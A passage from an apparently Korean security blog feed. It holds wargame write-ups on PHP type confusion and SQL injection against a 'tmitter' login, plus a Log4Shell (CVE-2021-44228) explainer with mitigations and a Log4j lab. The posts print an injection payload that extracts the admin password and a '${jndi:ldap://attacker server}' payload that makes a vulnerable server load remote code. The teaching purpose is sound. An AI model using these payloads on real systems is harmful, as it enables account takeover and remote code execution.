  <li>true를 출력하는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/263522608-064bd56d-02fe-47a1-9dd9-e66fcf4b79b7.png" alt="Pasted image 20230827192833" /></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>false 를 출력하는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/263522737-f1863132-0b67-47f0-9daa-7be5ecec854e.png" alt="Pasted image 20230827193102" /></p>
  </li>
  <li>
    <p>즉 <code class="language-plaintext highlighter-rouge">""</code> 아무것도 없을 때는 false 로 타입 변환이 일어나고 <code class="language-plaintext highlighter-rouge">"asdf"</code> 임의의 글자가 있을 때는 true 로 타입 변환이 되는 것을 확인할 수 있다.</p>
  </li>
</ul>

<h3 id="공격-페이로드">공격 페이로드</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>json={"key":true}

if($json-&gt;key == "xyz") 비교 하면
"xyz" =&gt; true 로 형 변환이 일어난다.
</code></pre></div></div>

<h3 id="대응-방안">대응 방안</h3>

<ul>
  <li>php 에서 두개의 값을 비교할 때 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 값 만 비교하는 것이 아닌 <code class="language-plaintext highlighter-rouge">===</code> 을 사용하여 값과 타입을 모두 비교하도록 해주면 된다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://m.blog.naver.com/wnsdnakdhkd6/221976728186">php type confusion</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="type confusion" /><summary type="html"><![CDATA[type confusion 을 통해 if 문 인증을 우회할 수 있다.]]></summary></entry><entry><title type="html">[wargame.kr]tmitter 문제</title><link href="http://localhost:4000/dreamhack/tmitter%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="[wargame.kr]tmitter 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/tmitter%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/dreamhack/tmitter%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="sql-injection">SQL Injection</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/writeups/11825">문제</a></li>
</ul>

<h3 id="방법-1">방법 1.</h3>
<ul>
  <li>insert 문을 예측하여 admin 계정의 비밀번호를 얻어 주었다.</li>
  <li>union sql injection</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test','1'),('key','name',(select ps from tmitter_user where id='admin'),'3')#
</code></pre></div></div>

<h3 id="방법-2">방법 2.</h3>
<ul>
  <li>아이디 검사 시스템의 허점을 이용하여 방법이다.</li>
  <li>서버에서 아이디의 최대 길이를 검사하지 않아 발생한 문제이다.</li>
  <li>로그인 방식을 예측하기.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from tmitter_user where id=아이디 and pw=비밀번호
</code></pre></div></div>

<ul>
  <li>
    <p>아이디 크기가 char(32) 이다. 따라서 회원 가입을 할 때 서버에서 아이디 길이를 따로 검사하지 않는다 따라서 아이디가 저장될 때 32 바이트 만을 저장한다. 그리고 mysql 에서 데이터를 저장할 때 공백을 생략하는 것 같다.</p>
  </li>
  <li>
    <p>회원가입</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=admin++++++++++++++++++++++++++++++++++++1&amp;pw=1234567
</code></pre></div></div>

<ul>
  <li>두 개의 admin 계정이 생성되었다.</li>
  <li>원래 admin 계정과 현재 만든 admin 계정 두 개가 생성되어있다.</li>
  <li>후에 만든 admin 계정으로 로그인을 하면 원래 admin 계정으로 로그인 되는 것을 확인할 수 있다. 왜냐하면 db에 먼저 저장된 admin 이라는 id의 정보를 읽어오기 때문이다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://private.tistory.com/63">여러개 한번에 insert 하기</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="sqli" /><summary type="html"><![CDATA[tmitter 문제 풀이.]]></summary></entry><entry><title type="html">CVE-2021-44228 Log4shell 취약점에 대하여 알아보자.</title><link href="http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="CVE-2021-44228 Log4shell 취약점에 대하여 알아보자." /><published>2023-08-17T00:00:00+09:00</published><updated>2023-08-17T23:13:00+09:00</updated><id>http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="cve-2021-44228-log4shell-취약점">CVE-2021-44228 Log4Shell 취약점</h2>

<h3 id="취약점-정보">취약점 정보</h3>
<ul>
  <li>Apache Log4j 의 JNDI(Java Naming and Directory Interface) Injection 취약점이다.</li>
  <li>영향을 받는 Apache Log4j 버전의 메세지에 신뢰할 수 없는 데이터(악성 페이로드)를 포함함으로써 공격자는 JNDI 조회를 악성 서버에 연결할 수 있다.</li>
  <li>RCE ( Remote Code Excution ) 즉 원격으로 악성 코드를 서버에서 실행시킬 수 있다.</li>
  <li>원격으로 악성 코드를 서버로 다운로드 및 실행 시키는 공격이다.</li>
</ul>

<h3 id="취약점-버전">취약점 버전</h3>
<ul>
  <li>Log4j2 &lt;= 2.14.1</li>
  <li>jdk version &lt; 6u211, 7u201, 8u191, 11.0.1</li>
</ul>

<h3 id="보안-취약점-원인">보안 취약점 원인</h3>
<h4 id="log4j의-message-lookup-기능과-lookups의-jndi-기능">Log4j의 Message Lookup 기능과 Lookups의 JNDI 기능</h4>
<ul>
  <li>Message Lookup 패턴 기능과 Lookup의 JNDI기능 때문에 발생하는 취약점이다.</li>
  <li>원래 서버 내부에서 운영중인 LDAP 서버에 접속하여 코드를 서버로 다운로드 및 실행시키는 기능이다.</li>
  <li>공격자는 이를 악용하여 공격자의 LDAP 서버에 접속하여 악성 코드를 서버로 다운로드 및 실행 시킨다.</li>
  <li>취약한 코드 예시. Message Lookup 기능과 Lookup의 JNDI 기능을 이용한 공격이다.</li>
  <li>공격자의 payload 가 log 메세지에 삽입되어 발생되는 공격이다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"test "</span><span class="o">+</span><span class="s">"${jndi:ldap://공격자 서버}"</span><span class="o">);</span>
</code></pre></div></div>

<h3 id="jndi-란">JNDI 란?</h3>
<ul>
  <li>java 로 작성된 에플리케이션을 DNS, LDAP, RMI, NDS 등과 같은 Naming / Directory 서비스에 연결하기  위한 API 이다.</li>
</ul>

<h3 id="ldap-란">LDAP 란?</h3>
<ul>
  <li>Lightweight Directory Access Protocol 경량 디렉터리 엑세스 프로토콜.</li>
  <li>디렉터리 서비스를 조회하고 수정하는 응용 프로토콜(7계층)이다.</li>
</ul>

<h3 id="log4shell공격-payload">Log4Shell공격 Payload</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://공격자 서버}
</code></pre></div></div>

<h3 id="log4shell-공격-동작-방식">Log4Shell 공격 동작 방식</h3>
<ul>
  <li>공격자</li>
  <li>공격자 LDAP 서버</li>
  <li>공격자 HTTP 서버 : 악성 class 또는 jar 파일을 가지고 있는 곳이다.</li>
  <li>취약한 웹 서버 : 취약한 버전의 log4j 버전과 jdk 버전을 이용하고 있어야 한다.</li>
</ul>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOybuSDshJzrsoQgOiDqs7XqsqkgUGF5bG9hZCDsoITri6xcbuybuSDshJzrsoQgLT4-IOybuSDshJzrsoQgOiBwYXlsb2Fk66W8IOuhnOq5heydhCDsnITtlbQgbG9nNGrroZwg7J2R64u1IOuNsOydtO2EsCDsoITri6xcbuybuSDshJzrsoQgLT4-IOqzteqyqeyekCBMREFQIOyEnOuyhCA6IOyVheyEsSDrpqzrsoTsiqQg7ImYIO2MjOydvChjbGFzcyBvciBqYXIpIOychOy5mCDsoJXrs7Qg7JqU7LKtXG7qs7XqsqnsnpAgTERBUCDshJzrsoQgLT4-IOybuSDshJzrsoQgOiDslYXshLEg7YyM7J28IOydtOumhCDrsI8g7L2U65OcIOychOy5mCDsnZHri7VcbuybuSDshJzrsoQgLT4-IOqzteqyqeyekCBIVFRQIOyEnOuyhCA6IOyVheyEsSDtjIzsnbwg64uk7Jq066Gc65OcIOyalOyyrVxu6rO16rKp7J6QIEhUVFAg7ISc67KEIC0-PiDsm7kg7ISc67KEIDog7JWF7ISxIO2MjOydvCDsnZHri7VcbuybuSDshJzrsoQgLT4-IOybuSDshJzrsoQgOiDslYXshLEg7YyM7J28IOyLpO2WiVxu7Ju5IOyEnOuyhCAtPj4g6rO16rKp7J6QIDog66as67KE7IqkIOyJmOydhCDthrXtlZwg7Jew6rKwIiwibWVybWFpZCI6bnVsbH0" /></p>

<p><img src="https://user-images.githubusercontent.com/31990118/261207125-030bd82e-6262-4d7b-b52f-7e98a3fc6926.jpg" alt="log4j_attack" />
<a href="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/assets/log4j_attack.png">출처 : govcert</a></p>

<h3 id="대응-방안">대응 방안</h3>
<ul>
  <li>Log4j 버전 2.10 ~ 2.14.1 을 사용할 때 대응방안.  Lookup 기능을 비활성화하기.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java
-Dlog4j2.formatMsgNoLookups=true
...
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/31990118/261207377-549f5838-50e7-4c54-b352-20f3d45d6a54.png" alt="Pasted image 20230803170827" /></p>

<ul>
  <li>
    <p>취약점이 해결된 Log4j 2.17 이상 버전 이용하기. 왜냐하면 2.16.0 버전에서 message lookup patterns 이 제거되었고, JNDI 기능이 디펄트로 비활성화 되어있기 때문이다.</p>
  </li>
  <li>
    <p>jdk 버전 6u211, 7u201, 8u191, 11.0.1 이상으로 이용하기.  취약한 버전의 Log4j 버전을 사용하더라도 ldap.object.trustURLCodebase 의 디펄트 값이 false이기 때문에 외부에서 악성 코드를 다운로드 하지 않는다. 즉 웹 서버의 log4j는 공격자 서버에서 jar 또는 class 파일을 다운로드 받고 실행시키지 않는다.</p>
  </li>
  <li>
    <p>Remote codebase 를 disable 하기. 신뢰하지 못하는 외부 서버로 부터 jar 코드를 무단으로 다운 및 실행하지 않게한는 설정이다.</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LDAP 기반 설정
com.sun.jndi.ldap.object.trustURLCodebase=false
6u211, 7u201, 8u191, 11.0.1 버전 이상부터 false 가 default이다.

RMI 기반 설정
com.sun.jndi.cosnaming.object.trustURLCodebase=false
8u121 부터 false가 default 이다.
</code></pre></div></div>

<h3 id="참고-사이트">참고 사이트</h3>
<ul>
  <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/">Log4Shell Update: Second log4j Vulnerability Published</a></li>
  <li><a href="https://blog.o3g.org/server/log4j-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-44228-%EC%9D%84-%EB%A7%89%EB%8A%94-5%EA%B0%80%EC%A7%80-%EB%B0%A9%EB%B2%95/">Log4j 취약점 (CVE-2021-44228) 을 막는 5가지 방법 (o3g.org)</a></li>
  <li><a href="https://www.trendmicro.com/ko_kr/what-is/apache-log4j-vulnerability.html">Apache Log4J(Log4Shell) 취약점이란? (trendmicro.com)</a></li>
  <li><a href="https://www.kisec.com/rsrh_rpt_det.do?id=783">한국정보보호교육센터 (kisec.com)</a></li>
  <li><a href="https://ko.wikipedia.org/wiki/LDAP">LDAP - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><category term="log4shell" /><category term="CVE-2021-44228" /><category term="CVE" /><summary type="html"><![CDATA[Log4shell 취약점 무엇인지 정리해 보았다.]]></summary></entry><entry><title type="html">Log4j 직접 사용해보기</title><link href="http://localhost:4000/log4j%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0/" rel="alternate" type="text/html" title="Log4j 직접 사용해보기" /><published>2023-08-09T00:00:00+09:00</published><updated>2023-08-09T23:13:00+09:00</updated><id>http://localhost:4000/log4j%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/log4j%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0/"><![CDATA[<h2 id="log4j-란">Log4j 란</h2>
<ul>
  <li>컴퓨터가 언제, 무슨 일을 어떻게 했는지 남기는 도구이다.</li>
  <li>JAVA를 사용하여 Log를 남기는 도구이다.</li>
  <li>콘솔 및 파일출력 형태의 로깅을 지원한다.</li>
</ul>

<h2 id="log4j-실습">Log4j 실습</h2>

<ol>
  <li>먼저 버전에 맞는 log4j jar 파일을 <a href="https://archive.apache.org/dist/logging/log4j/">다운로드</a>하기. 여기서는 log4j-2.14.1 버전을 이용하여 실습을 진행하였다.</li>
  <li>여기서는 log4j-api-2.14.1.jar 과 log4j-core-2.14.1.jar 파일을 사용하여 테스트 하였다.</li>
  <li>테스트 자바 프로젝트 구조. bin 폴더에 컴파일이 완료된 class 파일이 들어간다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/32855c4e-c4c8-4cc0-93d9-ff7700ade6d9" alt="Pasted image 20230803151419" /></li>
  <li>테스트 코드.<br /><script src="https://gist.github.com/MinGyu2/d95d7a9d3bd8736dcb89b0cbbbc87c5e.js"></script></li>
  <li>컴파일 하기. 프로젝트 위치에서 아래의 명령어를 실행시켜 주면 된다. 그러면 bin/classes 폴더에 컴파일된 class 파일을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/3a442c140c8e5a6ca60bbf9773153ab0.js"></script><img src="https://user-images.githubusercontent.com/31990118/259305662-d0c16f6f-6b29-4f5e-b4b5-2766c4937c78.png" alt="Pasted image 20230803153809" /></li>
  <li>
    <p>실행하기. 로그기록이 출력되는 것을 확인할 수 있다. 그리고 Lookup 기능의 동작을 확인할 수 있다.
<br /><script src="https://gist.github.com/MinGyu2/984a597d1105904eefb9330f8217ea53.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/259305774-677c9efa-e860-4ebd-97ef-8bcb97c41fbe.png" alt="Pasted image 20230803153939" /></p>
  </li>
  <li>메세지 LookUps 기능은 log4j 2.15.0 에서 디펄트로 꺼져있다. 그리고 이 기능은 log4j 2.16.0 (2.12.2, 2.12.3, 2.3.1)에서 완전히 제거되었다. log4j 2.19.0 으로 테스트 해보면 lookUp 기능이 동작안하는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e6932b91-3b8e-4dba-80c7-fe54f7f9a811" alt="Pasted image 20230809152136" /><br /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fb24b755-ae59-4222-8a49-400989498151" alt="Pasted image 20230809152205" /></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">NVD - CVE-2021-44228 (nist.gov)</a></li>
  <li><a href="https://logging.apache.org/log4j/2.x/release-notes/2.16.0.html">Log4j – (apache.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><summary type="html"><![CDATA[Log4j가 무엇인지 정리하고, 직접 사용해 보았다.]]></summary></entry></feed>